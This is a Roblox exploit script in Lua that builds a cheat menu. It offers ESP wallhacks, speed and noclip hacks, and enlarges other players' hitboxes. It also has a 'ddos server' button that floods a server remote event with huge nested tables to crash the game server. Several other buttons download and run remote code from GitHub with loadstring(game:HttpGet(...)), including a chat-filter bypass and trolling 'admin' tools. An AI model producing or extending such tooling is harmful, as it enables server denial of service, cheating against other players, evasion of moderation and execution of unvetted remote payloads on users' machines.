local function sendMessage(message)
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
        :WaitForChild("SayMessageRequest"):FireServer(message, "All")
end

sendMessage("Script made by PROTOCOLHERE") --send message to chat

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "4TH DİMENSİON", HidePremium = false, IntroText = "4TH DİMENSİON" , SaveConfig = true, ConfigFolder = "OrionTest"})

local PlayerTab = Window:MakeTab({
  Name = "Player",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
})

PlayerTab:AddButton({
	Name = "ESP",
	Callback = function()
      		print("CHEAT ACTİVE")
            game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="Extra Sensory Perception (esp) active!"; Duration=5;})
-- LocalScript
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to create a larger health bar, display player's name, and draw a square around the player
local function createHealthBar(player)
    local humanoid = player.Character:WaitForChild("Humanoid")

    -- Create a BillboardGui for the player's name
    local nameTag = Instance.new("BillboardGui")
    nameTag.Name = "NameTag"
    nameTag.Size = UDim2.new(6, 0, 1, 0) -- Increase size for better visibility
    nameTag.StudsOffset = Vector3.new(0, 3, 0) -- Position above the player's head
    nameTag.Adornee = player.Character.Head
    nameTag.Parent = player.Character

    -- Create a TextLabel for the player's name
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Text = player.Name
    nameLabel.Size = UDim2.new(1, 0, 1, 0)
    nameLabel.TextColor3 = Color3.new(1, 1, 1)
    nameLabel.Parent = nameTag

    -- Create a larger health bar
    local healthBar = Instance.new("BillboardGui")
    healthBar.Name = "HealthBar"
    healthBar.Size = UDim2.new(8, 0, 0.6, 0) -- Increase size for better visibility
    healthBar.StudsOffset = Vector3.new(0, 4, 0) -- Position slightly above the player's head

    local healthFrame = Instance.new("Frame")
    healthFrame.Name = "HealthFrame"
    healthFrame.Size = UDim2.new(humanoid.Health / humanoid.MaxHealth, 0, 1, 0)
    healthFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green color
    healthFrame.Parent = healthBar

    healthBar.Adornee = player.Character.Head
    healthBar.Parent = player.Character

    -- Update health bar when player's health changes
    humanoid.HealthChanged:Connect(function(health)
        healthFrame.Size = UDim2.new(health / humanoid.MaxHealth, 0, 1, 0)
    end)

    -- Draw a square around the player with visibility through walls
    local square = Instance.new("SelectionBox")
    square.Name = "ESP"
    square.Color3 = Color3.new(0, 1, 0) -- Green color
    square.LineThickness = 0.1 -- Increase line thickness for better visibility
    square.SurfaceTransparency = 0.5 -- Make the box visible through walls
    square.Adornee = player.Character
    square.Parent = player.Character

    -- Set BillboardGui's AlwaysOnTop property to true for name and health bar
    nameTag.AlwaysOnTop = true
    healthBar.AlwaysOnTop = true
end

-- Update the list of players
local function updatePlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
            createHealthBar(player)
        end
    end
end

-- Re-create health bars when players are added or removed
Players.PlayerAdded:Connect(updatePlayers)
Players.PlayerRemoving:Connect(updatePlayers)
updatePlayers() -- Create health bars for existing players
        end
    })

PlayerTab:AddButton({
	Name = "Speed (100)",
	Callback = function()
      		print("CHEAT ACTİVE")
            game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="speed cheat active! kacaovv!!"; Duration=5;})
      -- LocalScript
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Set the speed to 100
LocalPlayer.Character.Humanoid.WalkSpeed = 100
  	end
})

PlayerTab:AddButton({
	Name = "no cooldown (jump)",
	Callback = function()
      		print("CHEAT ACTİVE")
            game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="jump cheat active no cooldown!"; Duration=5;})

-- LocalScript
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to handle jump without cooldown
local function handleJumpWithoutCooldown()
    LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
end

-- Bind jump action to a user input event
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Space then
        handleJumpWithoutCooldown()
    end
        end)
end
})

PlayerTab:AddButton({
	Name = "Bigger hitbox (for player)",
	Callback = function()
      		print("CHEAT ACTİVE")
            game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="I'm like Ronnie Coleman now"; Duration=5;})

-- Function to increase hitbox size of other players
local function increaseOtherPlayersHitbox()
    -- Get all players in the game
    local players = game:GetService("Players"):GetPlayers()
    -- Loop through each player
    for _, player in ipairs(players) do
        -- Check if the player is not the local player
        if player ~= game:GetService("Players").LocalPlayer then
            -- Increase hitbox size by 10 times
            player.Character.HumanoidRootPart.Size = Vector3.new(13, 13, 10)
        end
    end
end

-- Call the function to increase hitbox size of other players
increaseOtherPlayersHitbox()
  	end
})

PlayerTab:AddButton({
	Name = "noclip",
	Callback = function()
      		print("CHEAT ACTİVE")
game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="noclip active!"; Duration=5;})

local Noclip = nil
local Clip = nil

function noclip()
	Clip = false
	local function Nocl()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
					v.CanCollide = false
				end
			end
		end
		wait(0.21) -- basic optimization
	end
	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
end

function clip()
	if Noclip then Noclip:Disconnect() end
	Clip = true
end

noclip() -- to toggle noclip() and clip()
        end
    })

PlayerTab:AddButton({
	Name = "inf jump",
	Callback = function()
      		print("CHEAT ACTİVE")
	game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="İnf jump active!"; Duration=5;})

	local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
    end
  })

PlayerTab:AddButton({
	Name = "anti afk",
	Callback = function()
      		print("CHEAT ACTİVE")

      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="Anti afk active!"; Duration=5;})
      
      -- LocalScript
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Function to click the mouse
local function clickMouse()
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.Button1Down:Connect(function()
        mouse.Button1Down:Wait()
    end)
end

-- Function to reset the timer and click the mouse
local function resetTimer()
    clickMouse()
    wait(600) -- 600 seconds = 10 minutes
end

-- Start the timer loop
while true do
    resetTimer()
      end
  	end
})

local TrollTab = Window:MakeTab({
	Name = "Troll",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

PlayerTab:AddButton({
	Name = "Reset character",
	Callback = function()
      		print("CHEAT ACTİVE")
      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="OOFFFF"; Duration=5;})
local karakter_olum = true

local character = game:GetService("Players").LocalPlayer.Character
character:BreakJoints()
wait(1)
game:GetService("Players").LocalPlayer:LoadCharacter()
    end
  })

TrollTab:AddButton({
	Name = "ddos server",
	Callback = function()
      		print("Cheat avtive")
      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="DDOS IS SENDING... (you should not leave the game during this time Stay in the game until the internet error occurs)"; Duration=5;})
      local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
 
bomb(289, 5) --// change values if client crashes
      end
  	end
})

TrollTab:AddButton({
	Name = "Chat bypass",
	Callback = function()
      		print("CHEAT ACTİVE")
      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="in your main accounts do not use It is recommended to log in from a side account"; Duration=5;})
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
  	end
})

local GameTab = Window:MakeTab({
	Name = "Games",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

GameTab:AddButton({
	Name = "Survive the killer",
	Callback = function()
      		print("CHEAT ACTİVE")
      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="There is a risk of ban Try not to be reported to the admins, do not sabotage the game too much"; Duration=5;})
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
  	end
})

TrollTab:AddButton({
	Name = "admin scripts",
	Callback = function()
      		print("CHEAT ACTİVE")
      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="Cheat active!"; Duration=5;})
      loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
  	end
})

TrollTab:AddButton({
	Name = "Chat control",
	Callback = function()
      		print("CHEAT ACTİVE")
      game.StarterGui:SetCore("SendNotification", {Title="4TH DİMENSİON"; Text="/e chat (player name) use it this way"; Duration=5;})
      loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/FE%20chat%20for%20someone.Lua"))();
  	end
})

GameTab:AddButton({
	Name = "Blox fruits",
	Callback = function()
      		print("CHEAT ACTİVE")
		loadstring(game:HttpGet"https://raw.githubusercontent.com/Basicallyy/Basicallyy/main/MinGamingV4.lua")()
  	end    
})

OrionLib:Init()
